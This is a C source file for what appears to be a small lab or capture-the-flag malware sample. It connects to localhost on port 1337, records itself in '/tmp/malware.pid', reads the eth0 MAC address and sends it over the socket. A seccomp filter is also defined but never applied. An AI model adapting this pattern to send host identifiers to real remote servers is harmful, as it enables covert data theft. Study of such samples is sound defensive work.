#include <stdio.h>
#include <seccomp.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <seccomp.h>
#include <stddef.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <string.h>


struct sock_filter filter[] = {
    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(struct seccomp_data, nr))),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_read, 1, 0),
    BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_write, 0, 1),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
    .filter = filter,
};

struct sockaddr_in server = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = 0x1000007f,
    .sin_port = 14597,
};


struct ifreq ifr;
char *interface = "eth0";

int main() {
    int socket_desc , pid, fd;
    struct sockaddr_in client;
     
    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);

    connect(socket_desc, &server, sizeof(struct sockaddr_in));

    int yes = 1;
    setsockopt(socket_desc, SOL_SOCKET, SO_KEEPALIVE, &yes, sizeof(int));

    int idle = 1;
    setsockopt(socket_desc, IPPROTO_TCP, TCP_KEEPIDLE, &idle, sizeof(int));

    pid = getpid();
    if(access("/tmp/malware.pid", R_OK|W_OK)){
        fd = open("/tmp/malware.pid", O_CREAT|O_WRONLY|O_APPEND, 0644);
        write(fd, &pid, sizeof(int));
    }else{
        kill(pid, 9);
    }

    strcpy(ifr.ifr_name, interface);
    if (ioctl(socket_desc, SIOCGIFHWADDR, &ifr) == -1) {
        return 1;
    }

    write(socket_desc, ifr.ifr_hwaddr.sa_data, 6);


    return 0;
}